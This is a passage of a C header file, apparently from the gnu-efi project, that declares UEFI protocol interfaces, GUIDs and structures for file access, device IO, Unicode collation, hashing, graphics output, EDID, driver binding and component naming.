EFI_STATUS
(EFIAPI *EFI_FILE_WRITE_EX) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN OUT EFI_FILE_IO_TOKEN    *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_FLUSH_EX) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN OUT EFI_FILE_IO_TOKEN    *Token
    );

#define EFI_FILE_PROTOCOL_REVISION         0x00010000
#define EFI_FILE_PROTOCOL_REVISION2        0x00020000
#define EFI_FILE_PROTOCOL_LATEST_REVISION  EFI_FILE_PROTOCOL_REVISION2
#define EFI_FILE_HANDLE_REVISION           EFI_FILE_PROTOCOL_REVISION

typedef struct _EFI_FILE_HANDLE {
    UINT64                  Revision;
    EFI_FILE_OPEN           Open;
    EFI_FILE_CLOSE          Close;
    EFI_FILE_DELETE         Delete;
    EFI_FILE_READ           Read;
    EFI_FILE_WRITE          Write;
    EFI_FILE_GET_POSITION   GetPosition;
    EFI_FILE_SET_POSITION   SetPosition;
    EFI_FILE_GET_INFO       GetInfo;
    EFI_FILE_SET_INFO       SetInfo;
    EFI_FILE_FLUSH          Flush;
    EFI_FILE_OPEN_EX        OpenEx;
    EFI_FILE_READ_EX        ReadEx;
    EFI_FILE_WRITE_EX       WriteEx;
    EFI_FILE_FLUSH_EX       FlushEx;
} EFI_FILE_PROTOCOL, *EFI_FILE_HANDLE;

typedef EFI_FILE_PROTOCOL EFI_FILE;


//
// File information types
//

#define EFI_FILE_INFO_ID   \
    { 0x9576e92, 0x6d3f, 0x11d2, {0x8e, 0x39, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }

typedef struct {
    UINT64                  Size;
    UINT64                  FileSize;
    UINT64                  PhysicalSize;
    EFI_TIME                CreateTime;
    EFI_TIME                LastAccessTime;
    EFI_TIME                ModificationTime;
    UINT64                  Attribute;
    CHAR16                  FileName[1];
} EFI_FILE_INFO;

//
// The FileName field of the EFI_FILE_INFO data structure is variable length.
// Whenever code needs to know the size of the EFI_FILE_INFO data structure, it needs to
// be the size of the data structure without the FileName field.  The following macro
// computes this size correctly no matter how big the FileName array is declared.
// This is required to make the EFI_FILE_INFO data structure ANSI compilant.
//

#define SIZE_OF_EFI_FILE_INFO EFI_FIELD_OFFSET(EFI_FILE_INFO,FileName)

#define EFI_FILE_SYSTEM_INFO_ID    \
    { 0x9576e93, 0x6d3f, 0x11d2, {0x8e, 0x39, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }

typedef struct {
    UINT64                  Size;
    BOOLEAN                 ReadOnly;
    UINT64                  VolumeSize;
    UINT64                  FreeSpace;
    UINT32                  BlockSize;
    CHAR16                  VolumeLabel[1];
} EFI_FILE_SYSTEM_INFO;

//
// The VolumeLabel field of the EFI_FILE_SYSTEM_INFO data structure is variable length.
// Whenever code needs to know the size of the EFI_FILE_SYSTEM_INFO data structure, it needs
// to be the size of the data structure without the VolumeLable field.  The following macro
// computes this size correctly no matter how big the VolumeLable array is declared.
// This is required to make the EFI_FILE_SYSTEM_INFO data structure ANSI compilant.
//

#define SIZE_OF_EFI_FILE_SYSTEM_INFO EFI_FIELD_OFFSET(EFI_FILE_SYSTEM_INFO,VolumeLabel)

#define EFI_FILE_SYSTEM_VOLUME_LABEL_ID    \
    { 0xDB47D7D3,0xFE81, 0x11d3, {0x9A, 0x35, 0x00, 0x90, 0x27, 0x3F, 0xC1, 0x4D} }

typedef struct {
    CHAR16                  VolumeLabel[1];
} EFI_FILE_SYSTEM_VOLUME_LABEL;

#define SIZE_OF_EFI_FILE_SYSTEM_VOLUME_LABEL_INFO EFI_FIELD_OFFSET(EFI_FILE_SYSTEM_VOLUME_LABEL,VolumeLabel)

//
// For compatibility with older versions of gnu-efi
//
#define EFI_FILE_SYSTEM_VOLUME_LABEL_INFO_ID EFI_FILE_SYSTEM_VOLUME_LABEL_ID
#define EFI_FILE_SYSTEM_VOLUME_LABEL_INFO    EFI_FILE_SYSTEM_VOLUME_LABEL

//
// Load file protocol
//


#define EFI_LOAD_FILE_PROTOCOL_GUID \
    { 0x56EC3091, 0x954C, 0x11d2, {0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B} }
#define LOAD_FILE_PROTOCOL EFI_LOAD_FILE_PROTOCOL_GUID

INTERFACE_DECL(_EFI_LOAD_FILE_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_LOAD_FILE) (
    IN struct _EFI_LOAD_FILE_PROTOCOL  *This,
    IN EFI_DEVICE_PATH                  *FilePath,
    IN BOOLEAN                          BootPolicy,
    IN OUT UINTN                        *BufferSize,
    IN VOID                             *Buffer OPTIONAL
    );

typedef struct _EFI_LOAD_FILE_PROTOCOL {
    EFI_LOAD_FILE                       LoadFile;
} EFI_LOAD_FILE_PROTOCOL;

typedef struct _EFI_LOAD_FILE_PROTOCOL _EFI_LOAD_FILE_INTERFACE;
typedef EFI_LOAD_FILE_PROTOCOL EFI_LOAD_FILE_INTERFACE;

//
// Device IO protocol
//

#define EFI_DEVICE_IO_PROTOCOL_GUID \
    { 0xaf6ac311, 0x84c3, 0x11d2, {0x8e, 0x3c, 0x00, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }
#define DEVICE_IO_PROTOCOL EFI_DEVICE_IO_PROTOCOL_GUID

INTERFACE_DECL(_EFI_DEVICE_IO_PROTOCOL);

typedef enum {
    IO_UINT8,
    IO_UINT16,
    IO_UINT32,
    IO_UINT64,
//
// Specification Change: Copy from MMIO to MMIO vs. MMIO to buffer, buffer to MMIO
//
    MMIO_COPY_UINT8,
    MMIO_COPY_UINT16,
    MMIO_COPY_UINT32,
    MMIO_COPY_UINT64
} EFI_IO_WIDTH;

#define EFI_PCI_ADDRESS(_bus,_dev,_func) \
    ( (UINT64) ( (((UINTN)_bus) << 24) + (((UINTN)_dev) << 16) + (((UINTN)_func) << 8) ) )


typedef
EFI_STATUS
(EFIAPI *EFI_DEVICE_IO) (
    IN struct _EFI_DEVICE_IO_PROTOCOL *This,
    IN EFI_IO_WIDTH                 Width,
    IN UINT64                       Address,
    IN UINTN                        Count,
    IN OUT VOID                     *Buffer
    );

typedef struct {
    EFI_DEVICE_IO                   Read;
    EFI_DEVICE_IO                   Write;
} EFI_IO_ACCESS;

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_DEVICE_PATH) (
    IN struct _EFI_DEVICE_IO_PROTOCOL   *This,
    IN UINT64                           Address,
    IN OUT EFI_DEVICE_PATH              **PciDevicePath
    );

typedef enum {
    EfiBusMasterRead,
    EfiBusMasterWrite,
    EfiBusMasterCommonBuffer
} EFI_IO_OPERATION_TYPE;

typedef
EFI_STATUS
(EFIAPI *EFI_IO_MAP) (
    IN struct _EFI_DEVICE_IO_PROTOCOL   *This,
    IN EFI_IO_OPERATION_TYPE            Operation,
    IN EFI_PHYSICAL_ADDRESS             *HostAddress,
    IN OUT UINTN                        *NumberOfBytes,
    OUT EFI_PHYSICAL_ADDRESS            *DeviceAddress,
    OUT VOID                            **Mapping
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IO_UNMAP) (
    IN struct _EFI_DEVICE_IO_PROTOCOL   *This,
    IN VOID                             *Mapping
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IO_ALLOCATE_BUFFER) (
    IN struct _EFI_DEVICE_IO_PROTOCOL   *This,
    IN EFI_ALLOCATE_TYPE                Type,
    IN EFI_MEMORY_TYPE                  MemoryType,
    IN UINTN                            Pages,
    IN OUT EFI_PHYSICAL_ADDRESS         *HostAddress
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IO_FLUSH) (
    IN struct _EFI_DEVICE_IO_PROTOCOL   *This
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IO_FREE_BUFFER) (
    IN struct _EFI_DEVICE_IO_PROTOCOL   *This,
    IN UINTN                            Pages,
    IN EFI_PHYSICAL_ADDRESS             HostAddress
    );

typedef struct _EFI_DEVICE_IO_PROTOCOL {
    EFI_IO_ACCESS                       Mem;
    EFI_IO_ACCESS                       Io;
    EFI_IO_ACCESS                       Pci;
    EFI_IO_MAP                          Map;
    EFI_PCI_DEVICE_PATH                 PciDevicePath;
    EFI_IO_UNMAP                        Unmap;
    EFI_IO_ALLOCATE_BUFFER              AllocateBuffer;
    EFI_IO_FLUSH                        Flush;
    EFI_IO_FREE_BUFFER                  FreeBuffer;
} EFI_DEVICE_IO_PROTOCOL;

typedef struct _EFI_DEVICE_IO_PROTOCOL _EFI_DEVICE_IO_INTERFACE;
typedef EFI_DEVICE_IO_PROTOCOL EFI_DEVICE_IO_INTERFACE;

//
// Unicode Collation protocol
//

#define EFI_UNICODE_COLLATION_PROTOCOL_GUID \
    { 0x1d85cd7f, 0xf43d, 0x11d2, {0x9a, 0xc,  0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }
#define UNICODE_COLLATION_PROTOCOL EFI_UNICODE_COLLATION_PROTOCOL_GUID

#define EFI_UNICODE_BYTE_ORDER_MARK       (CHAR16)(0xfeff)
#define UNICODE_BYTE_ORDER_MARK EFI_UNICODE_BYTE_ORDER_MARK

INTERFACE_DECL(_EFI_UNICODE_COLLATION_PROTOCOL);

typedef
INTN
(EFIAPI *EFI_UNICODE_STRICOLL) (
    IN struct _EFI_UNICODE_COLLATION_PROTOCOL  *This,
    IN CHAR16                         *s1,
    IN CHAR16                         *s2
    );

typedef
BOOLEAN
(EFIAPI *EFI_UNICODE_METAIMATCH) (
    IN struct _EFI_UNICODE_COLLATION_PROTOCOL  *This,
    IN CHAR16                         *String,
    IN CHAR16                         *Pattern
    );

typedef
VOID
(EFIAPI *EFI_UNICODE_STRLWR) (
    IN struct _EFI_UNICODE_COLLATION_PROTOCOL  *This,
    IN OUT CHAR16                       *Str
    );

typedef
VOID
(EFIAPI *EFI_UNICODE_STRUPR) (
    IN struct _EFI_UNICODE_COLLATION_PROTOCOL  *This,
    IN OUT CHAR16                       *Str
    );

typedef
VOID
(EFIAPI *EFI_UNICODE_FATTOSTR) (
    IN struct _EFI_UNICODE_COLLATION_PROTOCOL  *This,
    IN UINTN                            FatSize,
    IN CHAR8                            *Fat,
    OUT CHAR16                          *String
    );

typedef
BOOLEAN
(EFIAPI *EFI_UNICODE_STRTOFAT) (
    IN struct _EFI_UNICODE_COLLATION_PROTOCOL  *This,
    IN CHAR16                           *String,
    IN UINTN                            FatSize,
    OUT CHAR8                           *Fat
    );

//
// Hash Protocol
//
#define EFI_HASH_PROTOCOL_GUID \
  { 0xC5184932, 0xDBA5, 0x46DB, { 0xA5, 0xBA, 0xCC, 0x0B, 0xDA, 0x9C, 0x14, 0x35 } }
#define HASH_PROTOCOL EFI_HASH_PROTOCOL_GUID

#define EFI_HASH_ALGORITHM_SHA1_GUID \
  { 0x2AE9D80F, 0x3FB2, 0x4095, { 0xB7, 0xB1, 0xE9, 0x31, 0x57, 0xB9, 0x46, 0xB6 } } // Deprecated
#define EFI_HASH_ALGORITHM_SHA1 EFI_HASH_ALGORITHM_SHA1_GUID

#define EFI_HASH_ALGORITHM_SHA224_GUID \
  { 0x8DF01A06, 0x9BD5, 0x4BF7, { 0xB0, 0x21, 0xDB, 0x4F, 0xD9, 0xCC, 0xF4, 0x5B } } // Deprecated
#define EFI_HASH_ALGORITHM_SHA224 EFI_HASH_ALGORITHM_SHA224_GUID

#define EFI_HASH_ALGORITHM_SHA256_GUID \
  { 0x51AA59DE, 0xFDF2, 0x4EA3, { 0xBC, 0x63, 0x87, 0x5F, 0xB7, 0x84, 0x2E, 0xE9 } } // Deprecated
#define EFI_HASH_ALGORITHM_SHA256 EFI_HASH_ALGORITHM_SHA256_GUID

#define EFI_HASH_ALGORITHM_SHA384_GUID \
  { 0xEFA96432, 0xDE33, 0x4DD2, { 0xAE, 0xE6, 0x32, 0x8C, 0x33, 0xDF, 0x77, 0x7A } } // Deprecated
#define EFI_HASH_ALGORITHM_SHA384 EFI_HASH_ALGORITHM_SHA384_GUID

#define EFI_HASH_ALGORITHM_SHA512_GUID \
  { 0xCAA4381E, 0x750C, 0x4770, { 0xB8, 0x70, 0x7A, 0x23, 0xB4, 0xE4, 0x21, 0x30 } } // Deprecated
#define EFI_HASH_ALGORITHM_SHA512 EFI_HASH_ALGORITHM_SHA512_GUID

#define EFI_HASH_ALGORITHM_MD5_GUID \
  { 0x0AF7C79C, 0x65B5, 0x4319, { 0xB0, 0xAE, 0x44, 0xEC, 0x48, 0x4E, 0x4A, 0xD7 } } // Deprecated
#define EFI_HASH_ALGORITHM_MD5 EFI_HASH_ALGORITHM_MD5_GUID

#define EFI_HASH_ALGORITHM_SHA1_NOPAD_GUID \
  { 0x24C5DC2F, 0x53E2, 0x40CA, { 0x9E, 0xD6, 0xA5, 0xD9, 0xA4, 0x9F, 0x46, 0x3B } }
#define EFI_HASH_ALGORITHM_SHA1_NOPAD EFI_HASH_ALGORITHM_SHA1_NOPAD_GUID

#define EFI_HASH_ALGORITHM_SHA256_NOPAD_GUID \
  { 0x8628752A, 0x6CB7, 0x4814, { 0x96, 0xFC, 0x24, 0xA8, 0x15, 0xAC, 0x22, 0x26 } }
#define EFI_HASH_ALGORITHM_SHA256_NOPAD EFI_HASH_ALGORITHM_SHA256_NOPAD_GUID


INTERFACE_DECL(_EFI_HASH_PROTOCOL);

typedef UINT8 EFI_MD5_HASH[16];
typedef UINT8 EFI_SHA1_HASH[20];
typedef UINT8 EFI_SHA224_HASH[28];
typedef UINT8 EFI_SHA256_HASH[32];
typedef UINT8 EFI_SHA384_HASH[48];
typedef UINT8 EFI_SHA512_HASH[64];
typedef union _EFI_HASH_OUTPUT {
  EFI_MD5_HASH                    *Md5Hash;
  EFI_SHA1_HASH                   *Sha1Hash;
  EFI_SHA224_HASH                 *Sha224Hash;
  EFI_SHA256_HASH                 *Sha256Hash;
  EFI_SHA384_HASH                 *Sha384Hash;
  EFI_SHA512_HASH                 *Sha512Hash;
} EFI_HASH_OUTPUT;

typedef
EFI_STATUS
(EFIAPI *EFI_HASH_GET_HASH_SIZE) (
  IN CONST struct _EFI_HASH_PROTOCOL  *This,
  IN CONST EFI_GUID               *HashAlgorithm,
  OUT UINTN                       *HashSize);

typedef
EFI_STATUS
(EFIAPI *EFI_HASH_HASH) (
  IN CONST struct _EFI_HASH_PROTOCOL  *This,
  IN CONST EFI_GUID               *HashAlgorithm,
  IN BOOLEAN                      Extend,
  IN CONST UINT8                  *Message,
  IN UINT64                       MessageSize,
  IN OUT EFI_HASH_OUTPUT          *Hash);

typedef struct _EFI_HASH_PROTOCOL {
  EFI_HASH_GET_HASH_SIZE                  GetHashSize;
  EFI_HASH_HASH                           Hash;
} EFI_HASH_PROTOCOL;

typedef struct _EFI_HASH_PROTOCOL _EFI_HASH;
typedef EFI_HASH_PROTOCOL EFI_HASH;


typedef struct _EFI_UNICODE_COLLATION_PROTOCOL {

    // general
    EFI_UNICODE_STRICOLL                StriColl;
    EFI_UNICODE_METAIMATCH              MetaiMatch;
    EFI_UNICODE_STRLWR                  StrLwr;
    EFI_UNICODE_STRUPR                  StrUpr;

    // for supporting fat volumes
    EFI_UNICODE_FATTOSTR                FatToStr;
    EFI_UNICODE_STRTOFAT                StrToFat;

    CHAR8                               *SupportedLanguages;
} EFI_UNICODE_COLLATION_PROTOCOL;

typedef EFI_UNICODE_COLLATION_PROTOCOL EFI_UNICODE_COLLATION_INTERFACE;

/* Graphics output protocol */
#define EFI_GRAPHICS_OUTPUT_PROTOCOL_GUID \
   { 0x9042a9de, 0x23dc, 0x4a38, {0x96, 0xfb, 0x7a, 0xde, 0xd0, 0x80, 0x51, 0x6a } }
typedef struct _EFI_GRAPHICS_OUTPUT_PROTOCOL EFI_GRAPHICS_OUTPUT_PROTOCOL;

typedef struct {
  UINT32            RedMask;
  UINT32            GreenMask;
  UINT32            BlueMask;
  UINT32            ReservedMask;
} EFI_PIXEL_BITMASK;

typedef enum {
  PixelRedGreenBlueReserved8BitPerColor,
  PixelBlueGreenRedReserved8BitPerColor,
  PixelBitMask,
  PixelBltOnly,
  PixelFormatMax
} EFI_GRAPHICS_PIXEL_FORMAT;

typedef struct {
  UINT32                     Version;
  UINT32                     HorizontalResolution;
  UINT32                     VerticalResolution;
  EFI_GRAPHICS_PIXEL_FORMAT  PixelFormat;
  EFI_PIXEL_BITMASK          PixelInformation;
  UINT32                     PixelsPerScanLine;
} EFI_GRAPHICS_OUTPUT_MODE_INFORMATION;

/**
  Return the current video mode information.

  @param  This       Protocol instance pointer.
  @param  ModeNumber The mode number to return information on.
  @param  SizeOfInfo A pointer to the size, in bytes, of the Info buffer.
  @param  Info       A pointer to callee allocated buffer that returns information about ModeNumber.

  @retval EFI_SUCCESS           Mode information returned.
  @retval EFI_BUFFER_TOO_SMALL  The Info buffer was too small.
  @retval EFI_DEVICE_ERROR      A hardware error occurred trying to retrieve the video mode.
  @retval EFI_NOT_STARTED       Video display is not initialized. Call SetMode ()
  @retval EFI_INVALID_PARAMETER One of the input args was NULL.

**/
typedef
EFI_STATUS
(EFIAPI *EFI_GRAPHICS_OUTPUT_PROTOCOL_QUERY_MODE) (
  IN  EFI_GRAPHICS_OUTPUT_PROTOCOL          *This,
  IN  UINT32                                ModeNumber,
  OUT UINTN                                 *SizeOfInfo,
  OUT EFI_GRAPHICS_OUTPUT_MODE_INFORMATION  **Info
  )
;

/**
  Return the current video mode information.

  @param  This              Protocol instance pointer.
  @param  ModeNumber        The mode number to be set.

  @retval EFI_SUCCESS       Graphics mode was changed.
  @retval EFI_DEVICE_ERROR  The device had an error and could not complete the request.
  @retval EFI_UNSUPPORTED   ModeNumber is not supported by this device.

**/
typedef
EFI_STATUS
(EFIAPI *EFI_GRAPHICS_OUTPUT_PROTOCOL_SET_MODE) (
  IN  EFI_GRAPHICS_OUTPUT_PROTOCOL *This,
  IN  UINT32                       ModeNumber
  );

typedef struct {
  UINT8 Blue;
  UINT8 Green;
  UINT8 Red;
  UINT8 Reserved;
} EFI_GRAPHICS_OUTPUT_BLT_PIXEL;

typedef union {
  EFI_GRAPHICS_OUTPUT_BLT_PIXEL Pixel;
  UINT32                        Raw;
} EFI_GRAPHICS_OUTPUT_BLT_PIXEL_UNION;

typedef enum {
  EfiBltVideoFill,
  EfiBltVideoToBltBuffer,
  EfiBltBufferToVideo,
  EfiBltVideoToVideo,
  EfiGraphicsOutputBltOperationMax
} EFI_GRAPHICS_OUTPUT_BLT_OPERATION;

/**
  The following table defines actions for BltOperations:

  <B>EfiBltVideoFill</B> - Write data from the  BltBuffer pixel (SourceX, SourceY)
  directly to every pixel of the video display rectangle
  (DestinationX, DestinationY) (DestinationX + Width, DestinationY + Height).
  Only one pixel will be used from the BltBuffer. Delta is NOT used.

  <B>EfiBltVideoToBltBuffer</B> - Read data from the video display rectangle
  (SourceX, SourceY) (SourceX + Width, SourceY + Height) and place it in
  the BltBuffer rectangle (DestinationX, DestinationY )
  (DestinationX + Width, DestinationY + Height). If DestinationX or
  DestinationY is not zero then Delta must be set to the length in bytes
  of a row in the BltBuffer.

  <B>EfiBltBufferToVideo</B> - Write data from the  BltBuffer rectangle
  (SourceX, SourceY) (SourceX + Width, SourceY + Height) directly to the
  video display rectangle (DestinationX, DestinationY)
  (DestinationX + Width, DestinationY + Height). If SourceX or SourceY is
  not zero then Delta must be set to the length in bytes of a row in the
  BltBuffer.

  <B>EfiBltVideoToVideo</B> - Copy from the video display rectangle (SourceX, SourceY)
  (SourceX + Width, SourceY + Height) .to the video display rectangle
  (DestinationX, DestinationY) (DestinationX + Width, DestinationY + Height).
  The BltBuffer and Delta  are not used in this mode.

  @param  This         Protocol instance pointer.
  @param  BltBuffer    Buffer containing data to blit into video buffer. This
                       buffer has a size of Width*Height*sizeof(EFI_GRAPHICS_OUTPUT_BLT_PIXEL)
  @param  BltOperation Operation to perform on BlitBuffer and video memory
  @param  SourceX      X coordinate of source for the BltBuffer.
  @param  SourceY      Y coordinate of source for the BltBuffer.
  @param  DestinationX X coordinate of destination for the BltBuffer.
  @param  DestinationY Y coordinate of destination for the BltBuffer.
  @param  Width        Width of rectangle in BltBuffer in pixels.
  @param  Height       Hight of rectangle in BltBuffer in pixels.
  @param  Delta        OPTIONAL

  @retval EFI_SUCCESS           The Blt operation completed.
  @retval EFI_INVALID_PARAMETER BltOperation is not valid.
  @retval EFI_DEVICE_ERROR      A hardware error occured writting to the video buffer.

**/
typedef
EFI_STATUS
(EFIAPI *EFI_GRAPHICS_OUTPUT_PROTOCOL_BLT) (
  IN  EFI_GRAPHICS_OUTPUT_PROTOCOL            *This,
  IN  EFI_GRAPHICS_OUTPUT_BLT_PIXEL           *BltBuffer,   OPTIONAL
  IN  EFI_GRAPHICS_OUTPUT_BLT_OPERATION       BltOperation,
  IN  UINTN                                   SourceX,
  IN  UINTN                                   SourceY,
  IN  UINTN                                   DestinationX,
  IN  UINTN                                   DestinationY,
  IN  UINTN                                   Width,
  IN  UINTN                                   Height,
  IN  UINTN                                   Delta         OPTIONAL
  );

typedef struct {
  UINT32                                 MaxMode;
  UINT32                                 Mode;
  EFI_GRAPHICS_OUTPUT_MODE_INFORMATION   *Info;
  UINTN                                  SizeOfInfo;
  EFI_PHYSICAL_ADDRESS                   FrameBufferBase;
  UINTN                                  FrameBufferSize;
} EFI_GRAPHICS_OUTPUT_PROTOCOL_MODE;

struct _EFI_GRAPHICS_OUTPUT_PROTOCOL {
  EFI_GRAPHICS_OUTPUT_PROTOCOL_QUERY_MODE  QueryMode;
  EFI_GRAPHICS_OUTPUT_PROTOCOL_SET_MODE    SetMode;
  EFI_GRAPHICS_OUTPUT_PROTOCOL_BLT         Blt;
  EFI_GRAPHICS_OUTPUT_PROTOCOL_MODE        *Mode;
};



/*
 * EFI EDID Discovered Protocol
 * UEFI Specification Version 2.5 Section 11.9
 */
#define EFI_EDID_DISCOVERED_PROTOCOL_GUID \
    { 0x1C0C34F6, 0xD380, 0x41FA, { 0xA0, 0x49, 0x8a, 0xD0, 0x6C, 0x1A, 0x66, 0xAA} }

typedef struct _EFI_EDID_DISCOVERED_PROTOCOL {
    UINT32   SizeOfEdid;
    UINT8   *Edid;
} EFI_EDID_DISCOVERED_PROTOCOL;



/*
 * EFI EDID Active Protocol
 * UEFI Specification Version 2.5 Section 11.9
 */
#define EFI_EDID_ACTIVE_PROTOCOL_GUID \
    { 0xBD8C1056, 0x9F36, 0x44EC, { 0x92, 0xA8, 0xA6, 0x33, 0x7F, 0x81, 0x79, 0x86} }

typedef struct _EFI_EDID_ACTIVE_PROTOCOL {
    UINT32   SizeOfEdid;
    UINT8   *Edid;
} EFI_EDID_ACTIVE_PROTOCOL;



/*
 * EFI EDID Override Protocol
 * UEFI Specification Version 2.5 Section 11.9
 */
#define EFI_EDID_OVERRIDE_PROTOCOL_GUID \
    { 0x48ECB431, 0xFB72, 0x45C0, { 0xA9, 0x22, 0xF4, 0x58, 0xFE, 0x04, 0x0B, 0xD5} }

INTERFACE_DECL(_EFI_EDID_OVERRIDE_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_EDID_OVERRIDE_PROTOCOL_GET_EDID) (
  IN      struct _EFI_EDID_OVERRIDE_PROTOCOL   *This,
  IN      EFI_HANDLE                           *ChildHandle,
  OUT     UINT32                               *Attributes,
  IN OUT  UINTN                                *EdidSize,
  IN OUT  UINT8                               **Edid);

typedef struct _EFI_EDID_OVERRIDE_PROTOCOL {
    EFI_EDID_OVERRIDE_PROTOCOL_GET_EDID  GetEdid;
} EFI_EDID_OVERRIDE_PROTOCOL;



INTERFACE_DECL(_EFI_SERVICE_BINDING);

typedef
EFI_STATUS
(EFIAPI *EFI_SERVICE_BINDING_CREATE_CHILD) (
    IN struct _EFI_SERVICE_BINDING *This,
    IN EFI_HANDLE                  *ChildHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SERVICE_BINDING_DESTROY_CHILD) (
    IN struct _EFI_SERVICE_BINDING *This,
    IN EFI_HANDLE                  ChildHandle
    );

typedef struct _EFI_SERVICE_BINDING {
    EFI_SERVICE_BINDING_CREATE_CHILD  CreateChild;
    EFI_SERVICE_BINDING_DESTROY_CHILD DestroyChild;
} EFI_SERVICE_BINDING;



/*
 * EFI Driver Binding Protocol
 * UEFI Specification Version 2.5 Section 10.1
 */
#define EFI_DRIVER_BINDING_PROTOCOL_GUID \
    { 0x18A031AB, 0xB443, 0x4D1A, { 0xA5, 0xC0, 0x0C, 0x09, 0x26, 0x1E, 0x9F, 0x71} }
#define DRIVER_BINDING_PROTOCOL EFI_DRIVER_BINDING_PROTOCOL_GUID

INTERFACE_DECL(_EFI_DRIVER_BINDING_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_DRIVER_BINDING_PROTOCOL_SUPPORTED) (
  IN      struct _EFI_DRIVER_BINDING_PROTOCOL *This,
  IN      EFI_HANDLE                          ControllerHandle,
  IN      EFI_DEVICE_PATH                     *RemainingDevicePath OPTIONAL);

typedef
EFI_STATUS
(EFIAPI *EFI_DRIVER_BINDING_PROTOCOL_START) (
  IN      struct _EFI_DRIVER_BINDING_PROTOCOL *This,
  IN      EFI_HANDLE                          ControllerHandle,
  IN      EFI_DEVICE_PATH                     *RemainingDevicePath OPTIONAL);

typedef
EFI_STATUS
(EFIAPI *EFI_DRIVER_BINDING_PROTOCOL_STOP) (
  IN      struct _EFI_DRIVER_BINDING_PROTOCOL *This,
  IN      EFI_HANDLE                          ControllerHandle,
  IN      UINTN                               NumberOfChildren,
  IN      EFI_HANDLE                          *ChildHandleBuffer OPTIONAL);

typedef struct _EFI_DRIVER_BINDING_PROTOCOL {
  EFI_DRIVER_BINDING_PROTOCOL_SUPPORTED       Supported;
  EFI_DRIVER_BINDING_PROTOCOL_START           Start;
  EFI_DRIVER_BINDING_PROTOCOL_STOP            Stop;
  UINT32                                      Version;
  EFI_HANDLE                                  ImageHandle;
  EFI_HANDLE                                  DriverBindingHandle;
} EFI_DRIVER_BINDING_PROTOCOL;

typedef struct _EFI_DRIVER_BINDING_PROTOCOL _EFI_DRIVER_BINDING;
typedef EFI_DRIVER_BINDING_PROTOCOL EFI_DRIVER_BINDING;


/*
 * Backwards compatibility with older GNU-EFI versions. Deprecated.
 */
#define EFI_DRIVER_SUPPORTED         EFI_DRIVER_BINDING_PROTOCOL_SUPPORTED
#define EFI_DRIVER_START             EFI_DRIVER_BINDING_PROTOCOL_START
#define EFI_DRIVER_STOP              EFI_DRIVER_BINDING_PROTOCOL_STOP



/*
 * EFI Component Name Protocol
 * Deprecated - use EFI Component Name 2 Protocol instead
 */
#define EFI_COMPONENT_NAME_PROTOCOL_GUID \
    {0x107A772C, 0xD5E1, 0x11D4, { 0x9A, 0x46, 0x00, 0x90, 0x27, 0x3F, 0xC1, 0x4D} }
#define COMPONENT_NAME_PROTOCOL EFI_COMPONENT_NAME_PROTOCOL_GUID

INTERFACE_DECL(_EFI_COMPONENT_NAME_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_COMPONENT_NAME_GET_DRIVER_NAME) (
  IN      struct _EFI_COMPONENT_NAME_PROTOCOL   *This,
  IN      CHAR8                                 *Language,
  OUT     CHAR16                                **DriverName);

typedef
EFI_STATUS
(EFIAPI *EFI_COMPONENT_NAME_GET_CONTROLLER_NAME) (
  IN      struct _EFI_COMPONENT_NAME_PROTOCOL   *This,
  IN      EFI_HANDLE                            ControllerHandle,
  IN      EFI_HANDLE                            ChildHandle OPTIONAL,
  IN      CHAR8                                 *Language,
  OUT     CHAR16                                **ControllerName);

typedef struct _EFI_COMPONENT_NAME_PROTOCOL {
  EFI_COMPONENT_NAME_GET_DRIVER_NAME      GetDriverName;
  EFI_COMPONENT_NAME_GET_CONTROLLER_NAME  GetControllerName;
  CHAR8                                   *SupportedLanguages;
} EFI_COMPONENT_NAME_PROTOCOL;

typedef struct _EFI_COMPONENT_NAME_PROTOCOL _EFI_COMPONENT_NAME;
typedef EFI_COMPONENT_NAME_PROTOCOL EFI_COMPONENT_NAME;


/*
 * EFI Component Name 2 Protocol
 * UEFI Specification Version 2.5 Section 10.5
 */
#define EFI_COMPONENT_NAME2_PROTOCOL_GUID \
    {0x6A7A5CFF, 0xE8D9, 0x4F70, { 0xBA, 0xDA, 0x75, 0xAB, 0x30, 0x25, 0xCE, 0x14} }
#define COMPONENT_NAME2_PROTOCOL EFI_COMPONENT_NAME2_PROTOCOL_GUID

INTERFACE_DECL(_EFI_COMPONENT_NAME2_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_COMPONENT_NAME2_GET_DRIVER_NAME) (
  IN      struct _EFI_COMPONENT_NAME2_PROTOCOL   *This,
  IN      CHAR8                                  *Language,
  OUT     CHAR16                                 **DriverName);

typedef
EFI_STATUS
(EFIAPI *EFI_COMPONENT_NAME2_GET_CONTROLLER_NAME) (
  IN      struct _EFI_COMPONENT_NAME2_PROTOCOL   *This,
  IN      EFI_HANDLE                             ControllerHandle,
  IN      EFI_HANDLE                             ChildHandle OPTIONAL,
  IN      CHAR8                                  *Language,
  OUT     CHAR16                                 **ControllerName);

typedef struct _EFI_COMPONENT_NAME2_PROTOCOL {
  EFI_COMPONENT_NAME2_GET_DRIVER_NAME       GetDriverName;
  EFI_COMPONENT_NAME2_GET_CONTROLLER_NAME   GetControllerName;
  CHAR8                                     *SupportedLanguages;
} EFI_COMPONENT_NAME2_PROTOCOL;

typedef struct _EFI_COMPONENT_NAME2_PROTOCOL _EFI_COMPONENT_NAME2;
typedef EFI_COMPONENT_NAME2_PROTOCOL EFI_COMPONENT_NAME2;



/*
 * EFI Loaded Image Protocol
 * UEFI Specification Version 2.5 Section 8.1
 */
#define EFI_LOADED_IMAGE_PROTOCOL_GUID \
